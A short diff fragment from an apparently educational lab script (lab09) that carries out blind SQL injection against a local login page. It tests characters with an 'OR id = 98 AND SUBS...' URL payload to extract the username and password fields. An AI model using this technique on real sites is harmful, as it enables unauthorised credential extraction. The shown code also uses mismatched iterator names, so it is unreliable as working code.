@@ -16,7 +16,7 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 
 
 listASCII=string.printable
-iterator=cycle('username','password')
+iterator=cycle(['username','password'])
 
 for x in xrange(0,100):
 	field=myIterator.next()
